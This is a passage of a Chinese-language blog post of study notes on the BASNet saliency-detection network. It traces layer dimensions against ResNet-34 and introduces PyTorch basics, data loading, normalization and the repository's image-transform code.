class="table-container"><table><thead><tr><th>Conv</th><th>RESNET34</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>56×56×64</td><td>224x224×64</td></tr><tr><td>kernel</td><td>3×3,64</td><td>3×3,64</td></tr><tr><td>padding</td><td>1</td><td>1</td></tr><tr><td>stride</td><td>1</td><td>1</td></tr><tr><td>output</td><td>56×56×64</td><td>224×224×64</td></tr></tbody></table></div><p>经过三个ResBlock后，RESNet34 output=56×56×64,BASNet output=224×224×224</p><p>此时在BASNet中输出特征图与输入图像依然有着相同的分辨率。</p><p>这和原来的ResNet-34不同，它在第一个特征图的分辨率缩小到了 1 / 4大小。</p><p><strong>这个改动使得网络在早期阶段就能够获取更高的分辨率特征图，也可以降低整体的感受野。</strong></p><p> 降低感受野有什么作用 感受野是增加还是降低有益:</p><p><strong>如果感受野太小，则只能观察到局部的特征，如果感受野太大，则获取了过多的无效信息</strong></p><p>3.stage2</p><p>ResBlock_num=4</p><div class="table-container"><table><thead><tr><th>CONV</th><th>RESNET34</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>56×56×64</td><td>224×224×64</td></tr><tr><td>kernel</td><td>3×3,128</td><td>3×3,128</td></tr><tr><td>padding</td><td>1</td><td>1</td></tr><tr><td>stride</td><td>第一个ResBlock为2，其余为1</td><td>第一个ResBlock为2，其余为1</td></tr><tr><td>output</td><td>28×28×128</td><td>112×112×128</td></tr></tbody></table></div><p>4.stage3</p><p>ResBlock_num=6</p><div class="table-container"><table><thead><tr><th>CONV</th><th>RESNET34</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>28×28×128</td><td>112×112×128</td></tr><tr><td>kernel</td><td>3×3,256</td><td>3×3,256</td></tr><tr><td>padding</td><td>1</td><td>1</td></tr><tr><td>stride</td><td>第一个ResBlock为2，其余为1</td><td>第一个ResBlock为2，其余为1</td></tr><tr><td>output</td><td>14×14×256</td><td>56×56×256</td></tr></tbody></table></div><p>5.stage4</p><p>ResBlock_num=3</p><div class="table-container"><table><thead><tr><th>CONV</th><th>RESNET34</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>14×14×256</td><td>56×56×256</td></tr><tr><td>kernel</td><td>3×3,512</td><td>3×3,512</td></tr><tr><td>padding</td><td>1</td><td>1</td></tr><tr><td>stride</td><td>第一个ResBlock为2，其余为1</td><td>第一个ResBlock为2，其余为1</td></tr><tr><td>output</td><td>7×7×512</td><td>28×28×512</td></tr></tbody></table></div><p>为了获得和ResNet-34一样的感受野，我们在ResNet-34第4个stage之后增加了2个额外的stages。这两个stages都由3个基础的ResBlock构成，有512个filters。在此之前有一个大小为2、不重叠的max pool层。</p><p>6.stage5</p><div class="table-container"><table><thead><tr><th>MAXPOOL</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>28×28×512</td></tr><tr><td>kernel</td><td>2×2</td></tr><tr><td>padding</td><td>0</td></tr><tr><td>stride</td><td>2</td></tr><tr><td>output</td><td>14×14×512</td></tr></tbody></table></div><p>关于padding和stride的细节论文里好像没写(根据代码和计算推一下,可能有误…</p><p>ResBlock_num=3</p><div class="table-container"><table><thead><tr><th>CONV</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>14×14×512</td></tr><tr><td>kernel</td><td>3×3,512</td></tr><tr><td>padding</td><td>1</td></tr><tr><td>stride</td><td>1</td></tr><tr><td>output</td><td>14×14×512</td></tr></tbody></table></div><p>7.stage6</p><div class="table-container"><table><thead><tr><th>MAXPOOL</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>14×14×512</td></tr><tr><td>kernel</td><td>2×2</td></tr><tr><td>padding</td><td>0</td></tr><tr><td>stride</td><td>2</td></tr><tr><td>output</td><td>7×7×512</td></tr></tbody></table></div><p>ResBlock_num=3</p><div class="table-container"><table><thead><tr><th>CONV</th><th>BASNET</th></tr></thead><tbody><tr><td>input</td><td>7×7×512</td></tr><tr><td>kernel</td><td>3×3,512</td></tr><tr><td>padding</td><td>1</td></tr><tr><td>stride</td><td>1</td></tr><tr><td>output</td><td>7×7×512</td></tr></tbody></table></div><p>至此,Encoder部分结束，BASNet输出的特征图大小与ResNet34输出特征图大小相同。</p><p>通过对特征图的计算，我对卷积与池化操作的细节和代码参数更加了解，也理解了网络中图片尺寸的变化过程以及网络的架构。</p><h4 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h4><p>为了进一步捕捉到全局信息，在Encoder和Decoder之间添加brige。包含三个有512filter,dilation为2的空洞卷积，每个卷积层后跟随一个BN和ReLU。</p><div class="table-container"><table><thead><tr><th>dila-conv</th><th>basnet</th></tr></thead><tbody><tr><td>input</td><td>7×7</td></tr><tr><td>kernel</td><td>3×3</td></tr><tr><td>dilation</td><td>2</td></tr><tr><td>padding</td><td>2</td></tr><tr><td>stride</td><td>1</td></tr><tr><td>output</td><td>7×7</td></tr></tbody></table></div><h4 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h4><p>Decoder结构几乎与Encoder对称。每个stage包括三个卷积层，每个卷积层后跟随BN,ReLU。每个stage的input都是前一层upsample和在Encoder中对应层concatenate而成的。</p><p>为了生成特征图的side-output，将每个decoder stage和bridge stage的多通道输出作为一个普通的 3 × 3 卷积层的输入，后面跟着一个双线性上采样以及一个sigmoid 函数。因而，给定输入图像，我们的预测模块在训练过程中就产生7个特征图。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>pytorch学习</p><p>开发文档:<a href="https://pytorch.org/docs/stable/index.html" target="_blank" rel="noopener">https://pytorch.org/docs/stable/index.html</a></p><h3 id="Tensors"><a href="#Tensors" class="headerlink" title="Tensors"></a>Tensors</h3><p><a href="https://zhuanlan.zhihu.com/p/347676809" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/347676809</a></p><p>Tensors张量是一种特殊的数据结构，它和数组还有矩阵十分相似。在Pytorch中，我们使用tensors来给模型的输入输出以及参数进行编码。 Tensors除了张量可以在gpu或其他专用硬件上运行来加速计算之外，其他用法类似于Numpy中的ndarrays。</p><p>1.创建方法</p><p>直接创建tensor/从numpy导入</p><p>2.属性</p><p>tensor.shape   <code>shape</code>是关于tensor维度的一个元组，它决定了输出tensor的维数。</p><p>tensor.dtype 数据类型</p><p>tensor.device 存储设备</p><p>3.操作</p><p>操作见开发文档，它们都可以在GPU上运行</p><h3 id="Autograd"><a href="#Autograd" class="headerlink" title="Autograd"></a>Autograd</h3><p><a href="https://zhuanlan.zhihu.com/p/347672836" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/347672836</a></p><p>神经网络(NNs)是作用在输入数据上的一系列嵌套函数的集合，这些函数由权重和误差来定义，被存储在PyTorch中的tensors中。  神经网络训练的两个步骤： 前向传播：在前向传播中，神经网络通过将接收到的数据与每一层对应的权重和误差进行运算来对正确的输出做出最好的预测。  反向传播：在反向传播中，神经网络调整其参数使得其与输出误差成比例。反向传播基于梯度下降策略，是链式求导法则的一个应用，以目标的负梯度方向对参数进行调整。</p><h3 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h3><p>:o:<a href="https://zhuanlan.zhihu.com/p/347678492" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/347678492</a></p><p>:o:<a href="https://blog.csdn.net/zkk9527/article/details/88399176（写的详细，适合新手阅读）" target="_blank" rel="noopener">https://blog.csdn.net/zkk9527/article/details/88399176（写的详细，适合新手阅读）</a></p><p>使用<code>torch.nn</code>包来构建神经网络.</p><p>一个<code>nn.Module</code>包含各个层和一个<code>forward(input)</code>方法,该方法返回<code>output</code>.</p><p><code>nn.Parameter</code>-一种张量,当把它赋值给一个<code>Module</code>时,被自动的注册为参数.</p><blockquote><p>神经网络的典型训练过程如下:</p><ul><li>定义神经网络模型,它有一些可学习的参数(或者权重);</li><li>在数据集上迭代;</li><li>通过神经网络处理输入;</li><li>计算损失(输出结果和正确值的差距大小)</li><li>将梯度反向传播会网络的参数;</li><li>更新网络的参数,主要使用如下简单的更新原则:<code>weight = weight - learning_rate * gradient</code></li></ul><p>在参数初始化完成之后，可以通过以下四个关键步骤来定义和训练神经网络：前向传播-&gt;损失计算-&gt;反向传播-&gt;更新参数</p></blockquote><p>1.建立网络与前向传播</p><p>如果你想做一个网络，需要先定义一个Class，继承 nn.Module</p><p>这个Class里面主要写两个函数，一个是初始化的__init__函数，另一个是forward函数。</p><p>先在初始化函数中定义  神经网络__init__里面就是定义卷积层，==当然先得super()一下，给父类nn.Module初始化一下。(Python的基础知识）==</p><p>神经网络深度学习其实==主要就是学习卷积核里的参数，像别的不需要学习和改变的，就不用放进去==。</p><p>forward为前向传递函数，这个函数必须写。真正执行数据的流动</p><p>这个Net的Class定义主要要注意两点</p><p>第一：是注意前后输出通道和输入通道的一致性。不能第一个卷积层输出4通道，第二个输入6通道，这样就会报错。</p><p>第二：它和我们常规的python的class还有一些不同。如何使用这个net</p><p>先定义一个Net的实例（毕竟Net只是一个类不能直接传参数，output=Net（input）当然不行）<code>net=Net()</code></p><p>假设你已经有一个要往神经网络的输入的数据“input”,这个input应该定义成tensor类型 <code>output=net(input)</code></p><p>2.损失计算</p><p>定义损失函数  以loss为例  将类进行实例化<code>compute_loss=nn.MSELoss()</code></p><p>之后就可以把你的神经网络的输出，和标准答案target传入进去：<code>loss=compute_loss(target,output)</code></p><p>3.反向传播</p><p><code>loss.backward()</code></p><p>如果是自己的定义的loss（比如你就自己定义了个def loss（x，y）：return y-x ）这样肯定直接backward会出错。所以应当用nn里面提供的函数。</p><p>如果想要定义自己的loss,必须也把loss定义成上面Net的样子，也是继承nn.Module，把传入的参数放进forward里面，具体的loss在forward里面算，最后return loss。__init__()就空着，写个super().__init__就行了。</p><p>4.更新参数</p><p><strong>在Net定义完以后</strong>，需要写一个优化器的定义</p><p>以SGD为例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> optim</span><br><span class="line">optimizer=optim.SGD(net.parameters(),lr=<span class="number">0.001</span>,momentum=<span class="number">0.9</span>)</span><br></pre></td></tr></table></figure><p>优化器也是一个类，先定义一个实例optimizer，然后之后会用。<strong>注意在optimizer定义的时候，==需要给SGD传入了net的参数parameters，这样之后优化器就掌握了对网络参数的控制权==，就能够对它进行修改了。传入的时候把学习率lr也传入了。</strong></p><p>在每次迭代之前，先把optimizer里存的梯度清零一下（因为W已经更新过的“更新量”下一次就不需要用了）·<code>optimizer.zero_grad()</code></p><p>在loss.backward()反向传播以后，更新参数： <code>optimizer.step()</code></p><p><a href="https://imgtu.com/i/cKuuE6" target="_blank" rel="noopener"><img src="https://z3.ax1x.com/2021/04/04/cKuuE6.png" alt="cKuuE6.png"></a></p><h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><h4 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h4><p><a href="https://blog.csdn.net/qq_37568167/article/details/105841129" target="_blank" rel="noopener">https://blog.csdn.net/qq_37568167/article/details/105841129</a></p><p>数据包含以下四个子模块：</p><ul><li>数据收集： img,label 原始数据和标签</li><li>数据划分： train训练集，valid验证集，test测试集</li><li>数据读取： DataLoader<br>   1） Sampler(生成index)；<br>2)  Dataset(读取Img，Label)；</li><li>数据预处理：transforms</li></ul><p><img src="https://img-blog.csdnimg.cn/20200429153312260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3NTY4MTY3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="DataLoader"><a href="#DataLoader" class="headerlink" title="DataLoader"></a>DataLoader</h5><p>torch.utils.data.DataLoader  功能：构建可迭代的数据装载器<br>参数：</p><pre><code>- dataset：Dataset类，决定数据从哪里读取及如何读取- batchsize：批大小- num_works：是否多进程读取数据- shuffle：每个epoch是否乱序- drop_last：当样本数不能被batchsize整除时，是否舍弃最后一批数据</code></pre><h6 id="Epoch、Iteration、Batchsize"><a href="#Epoch、Iteration、Batchsize" class="headerlink" title="Epoch、Iteration、Batchsize"></a>Epoch、Iteration、Batchsize</h6><pre><code>- Epoch：所有训练样本都已输入到模型中，称为一个epoch- Iteration：一批样本输入到模型中，称之为一个Iteration- Batchsize：批大小，决定一个Epoch有多少个iteration</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">样本总数：<span class="number">80</span> batchsize：<span class="number">8</span> </span><br><span class="line">　<span class="number">1</span>  epoch = <span class="number">10</span>  iteration  一次iteration输入<span class="number">8</span>个样本，所以一次的epoch=<span class="number">8</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">样本总数：<span class="number">87</span> batchsize：<span class="number">8</span></span><br><span class="line"> <span class="keyword">if</span>  drop_last = true   <span class="number">1</span> epoch = <span class="number">10</span>  iteration</span><br><span class="line"> <span class="keyword">else</span>  drop_last = false  <span class="number">1</span> epoch = <span class="number">11</span>  iteration</span><br></pre></td></tr></table></figure><h5 id="Dataset"><a href="#Dataset" class="headerlink" title="Dataset"></a>Dataset</h5><p>torch.utils.data.Dataset   功能：Dataset抽象类，所有自定义的Dataset需要继承它，并且要复写函数 <strong>getitem</strong>()</p><pre><code> - __getitem__()  ：接收一个索引，返回一个样本及标签</code></pre><h3 id="数据标准化与归一化"><a href="#数据标准化与归一化" class="headerlink" title="数据标准化与归一化"></a>数据标准化与归一化</h3><p><a href="https://blog.csdn.net/weixin_36604953/article/details/102652160" target="_blank" rel="noopener">https://blog.csdn.net/weixin_36604953/article/details/102652160</a></p><h4 id="归一化"><a href="#归一化" class="headerlink" title="归一化"></a>归一化</h4><p>Normalization</p><p>是对原始数据的线性变换，使结果值映射到[0 - 1]之间。</p><p>$x^*={\frac{x-min}{max-min}}$</p><p>其中max为样本数据的最大值，min为样本数据的最小值。这种方法有个缺陷就是当有新数据加入时，可能导致max和min的变化，需要重新定义。</p><p>归一化后的图像与原始图像存储的信息是一样的，不会有信息损失</p><p><strong>为什么进行归一化</strong></p><p><a href="https://www.zhihu.com/question/293640354" target="_blank" rel="noopener">https://www.zhihu.com/question/293640354</a></p><p>灰度数据表示有两种方法：</p><p> uint8类型   double类型</p><p>其中uint8类型数据的取值范围为 [0,255]，而double类型数据的取值范围为[0,1]，两者正好相差255倍。</p><p>对于double类型数据，其取值大于1时，就会表示为白色，不能显示图像的信息，故当运算数据类型为double时，为了显示图像要除255。</p><h4 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h4><p>Standardization</p><p>给予原始数据的均值（mean）和标准差（standard deviation）进行数据的标准化。将数据变换为均值为0，标准差为1的分布,并非一定是正态的。</p><p>转化函数为：</p><p>$x^*={\frac{x-\mu}{\sigma}}$</p><p>其中$\mu$是所有样本数据的均值，$\sigma$为所有样本数据的标准差。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="data-loader-py"><a href="#data-loader-py" class="headerlink" title="data_loader.py"></a>data_loader.py</h4><p>定义以下多个图片变换的操作</p><h5 id="ResacleT"><a href="#ResacleT" class="headerlink" title="ResacleT"></a>ResacleT</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RescaleT</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="comment">#初始化output_size</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,output_size)</span>:</span></span><br><span class="line"><span class="keyword">assert</span> isinstance(output_size,(int,tuple))</span><br><span class="line">self.output_size = output_size</span><br><span class="line"><span class="comment">#调整sample为output_size,比例变,h=w=output_szie</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self,sample)</span>:</span></span><br><span class="line">image, label = sample[<span class="string">'image'</span>],sample[<span class="string">'label'</span>]</span><br><span class="line">        </span><br><span class="line">img = transform.resize(image,(self.output_size,self.output_size),mode=<span class="string">'constant'</span>)</span><br><span class="line">lbl = transform.resize(label,(self.output_size,self.output_size),mode=<span class="string">'constant'</span>, order=<span class="number">0</span>, preserve_range=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;<span class="string">'image'</span>:img,<span class="string">'label'</span>:lbl&#125;</span><br></pre></td></tr></table></figure><h5 id="Rescale"><a href="#Rescale" class="headerlink" title="Rescale"></a>Rescale</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rescale</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="comment">#初始化output_size</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,output_size)</span>:</span></span><br><span class="line"><span class="keyword">assert</span> isinstance(output_size,(int,tuple))</span><br><span class="line">self.output_size = output_size</span><br><span class="line"><span class="comment">#调整图片为output_size,比例不变</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self,sample)</span>:</span> </span><br><span class="line">image, label = sample[<span class="string">'image'</span>],sample[<span class="string">'label'</span>]</span><br><span class="line"></span><br><span class="line">h, w = image.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> isinstance(self.output_size,int):</span><br><span class="line"><span class="keyword">if</span> h &gt; w:</span><br><span class="line">new_h, new_w = self.output_size*h/w,self.output_size</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">new_h, new_w = self.output_size,self.output_size*w/h</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">new_h, new_w = self.output_size</span><br><span class="line"></span><br><span class="line">new_h, new_w = int(new_h), int(new_w)</span><br><span class="line">        </span><br><span class="line">img = transform.resize(image,(new_h,new_w),mode=<span class="string">'constant'</span>)</span><br><span class="line">lbl = transform.resize(label,(new_h,new_w),mode=<span class="string">'constant'</span>, order=<span class="number">0</span>, preserve_range=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;<span class="string">'image'</span>:img,<span class="string">'label'</span>:lbl&#125;</span><br></pre></td></tr></table></figure><h5 id="CenterCrop"><a href="#CenterCrop" class="headerlink" title="CenterCrop"></a>CenterCrop</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CenterCrop</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="comment">#初始化output_size </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,output_size)</span>:</span></span><br><span class="line">        <span class="comment">#确认output_size为int或者元组</span></span><br><span class="line"><span class="keyword">assert</span> isinstance(output_size, (int, tuple))</span><br><span class="line"><span class="comment">#若为int,扩展为元组</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(output_size, int): </span><br><span class="line">self.output_size = (output_size, output_size)</span><br><span class="line"><span class="comment">#若为元组，直接对self.output_size进行赋值</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">assert</span> len(output_size) == <span class="number">2</span></span><br><span class="line">self.output_size = output_size</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self,sample)</span>:</span></span><br><span class="line">image, label = sample[<span class="string">'image'</span>], sample[<span class="string">'label'</span>]</span><br><span class="line"></span><br><span class="line">h, w = image.shape[:<span class="number">2</span>]</span><br><span class="line">new_h, new_w = self.output_size</span><br><span class="line"></span><br><span class="line"><span class="comment"># print("h: %d, w: %d, new_h: %d, new_w: %d"%(h, w, new_h, new_w))</span></span><br><span class="line"><span class="keyword">assert</span>((h &gt;= new_h) <span class="keyword">and</span> (w &gt;= new_w))</span><br><span class="line"><span class="comment">#计算中心偏移量</span></span><br><span class="line">h_offset = int(math.floor((h - new_h)/<span class="number">2</span>))</span><br><span class="line">w_offset = int(math.floor((w - new_w)/<span class="number">2</span>))</span><br><span class="line"><span class="comment">#对sample中心进行剪裁 取output_size大小</span></span><br><span class="line">image = image[h_offset: h_offset + new_h, w_offset: w_offset + new_w]</span><br><span class="line">label = label[h_offset: h_offset + new_h, w_offset: w_offset + new_w]</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;<span class="string">'image'</span>: image, <span class="string">'label'</span>: label&#125;</span><br></pre></td></tr></table></figure><h5 id="RandomCrop"><a href="#RandomCrop" class="headerlink" title="RandomCrop"></a>RandomCrop</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomCrop</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="comment">#同上 对output_size进行处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,output_size)</span>:</span></span><br><span class="line"><span class="keyword">assert</span> isinstance(output_size, (int, tuple))</span><br><span class="line"><span class="keyword">if</span> isinstance(output_size, int):</span><br><span class="line">self.output_size = (output_size, output_size)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">assert</span> len(output_size) == <span class="number">2</span></span><br><span class="line">self.output_size = output_size</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self,sample)</span>:</span></span><br><span class="line">image, label = sample[<span class="string">'image'</span>], sample[<span class="string">'label'</span>]</span><br><span class="line"></span><br><span class="line">h, w = image.shape[:<span class="number">2</span>]</span><br><span class="line">new_h, new_w = self.output_size</span><br><span class="line"><span class="comment">#随机确定sample的左上角 限制保留ouput_size大小</span></span><br><span class="line">top = np.random.randint(<span class="number">0</span>, h - new_h)</span><br><span class="line">left = np.random.randint(<span class="number">0</span>, w - new_w)</span><br><span class="line"><span class="comment">#对sample进行随机剪裁</span></span><br><span class="line">image = image[top: top + new_h, left: left + new_w]</span><br><span class="line">label = label[top: top + new_h, left: left + new_w]</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;<span class="string">'image'</span>: image, <span class="string">'label'</span>: label&#125;</span><br></pre></td></tr></table></figure><h5 id="ToTensorLab"><a href="#ToTensorLab" class="headerlink" title="ToTensorLab"></a>ToTensorLab</h5><h3 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h3><h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p>RuntimeError: CUDA out of memory. Tried to allocate 96.00 MiB</p><p><a href="https://blog.csdn.net/qq_29134801/article/details/102640138" target="_blank" rel="noopener">https://blog.csdn.net/qq_29134801/article/details/102640138</a></p><p>IndexError: invalid index of a 0-dim tensor. Use tensor.item() to convert a 0-dim tensor to a Python</p><p><a href="https://blog.csdn.net/chen645096127/article/details/94019443" target="_blank" rel="noopener">https://blog.csdn.net/chen645096127/article/details/94019443</a></p><h4 id="with-torch-no-grad"><a href="#with-torch-no-grad" class="headerlink" title="with torch.no_grad()"></a>with torch.no_grad()</h4><p><a href="https://blog.csdn.net/u014229742/article/details/110629886" target="_blank" rel="noopener">https://blog.csdn.net/u014229742/article/details/110629886</a></p><p>不使用with torch.no_grad():可以进行梯度反传等操作。</p><p>只是想要网络结果的话就不需要后向传播 ，如果你想通过网络输出的结果去进一步优化网络的话 就需要后向传播了。</p><p>使用验证集的时候，我们只是想看一下训练的效果，并不是想通过验证集来更新网络时，就可以使用with torch.no_grad()。</p><h4 id="torch-cat-问题"><a href="#torch-cat-问题" class="headerlink" title="torch.cat()问题"></a>torch.cat()问题</h4><p><a href="https://www.cnblogs.com/JeasonIsCoding/p/10162356.html" target="_blank" rel="noopener">https://www.cnblogs.com/JeasonIsCoding/p/10162356.html</a></p><p>torch.cat()按维度进行拼接</p><p>此处举例<code>hx = self.relu6d_1(self.bn6d_1(self.conv6d_1(torch.cat((hbg,h6),1))))</code></p><p>即7x7进行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print(hbg.shape)</span><br><span class="line">print(h6.shape)       print(torch.cat((hbg,h6),<span class="number">1</span>).shape)</span><br><span class="line">print(hx.shape)</span><br><span class="line">&gt;torch.Size([<span class="number">8</span>, <span class="number">512</span>, <span class="number">7</span>, <span class="number">7</span>])</span><br><span class="line">&gt;torch.Size([<span class="number">8</span>, <span class="number">512</span>, <span class="number">7</span>, <span class="number">7</span>])</span><br><span class="line">&gt;torch.Size([<span class="number">8</span>, <span class="number">1024</span>, <span class="number">7</span>, <span class="number">7</span>])</span><br><span class="line">&gt;torch.Size([<span class="number">8</span>, <span class="number">512</span>, <span class="number">7</span>, <span class="number">7</span>])</span><br></pre></td></tr></table></figure><p>按通道进行拼接</p><p>拼接后通过卷积(512个kernels)将1024通道数变为512提取特征</p><p>进行后续操作</p><h3 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h3><p><a href="https://bbs.cvmart.net/articles/410/xian-zhu-xing-fen-ge-jian-ce-de-shu-ju-ji-hui-zong" target="_blank" rel="noopener">https://bbs.cvmart.net/articles/410/xian-zhu-xing-fen-ge-jian-ce-de-shu-ju-ji-hui-zong</a></p><div class="table-container"><table><thead><tr><th>DATASET</th><th>NUM</th><th>STATUS</th></tr></thead><tbody><tr><td>SOD</td><td>300</td><td>√</td></tr><tr><td>DUT-OMRON</td><td>5168</td><td>√</td></tr><tr><td>MSRA-10K</td><td>10000</td><td>√</td></tr><tr><td>PASCAL-S</td><td>850</td><td>√</td></tr><tr><td>HKU-IS</td><td>4445</td><td>√</td></tr><tr><td>DUTS-TR</td><td>10553</td><td>√</td></tr><tr><td>DUTS-TE</td><td>5019</td><td>√</td></tr><tr><td>THUR-15K</td><td>?</td><td>×</td></tr><tr><td>ECSSD</td><td>1000</td><td>√</td></tr><tr><td>Judd</td><td>900</td><td>√</td></tr><tr><td>SOC</td><td>?</td><td>×</td></tr><tr><td>SED2</td><td>?</td><td>×</td></tr></tbody></table></div>]]></content>
    
    
    <categories>
      
      <category>Paper reading</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于mirai和graia框架的机器人搭建</title>
    <link href="/2021/01/10/bot/"/>
    <url>/2021/01/10/bot/</url>
    
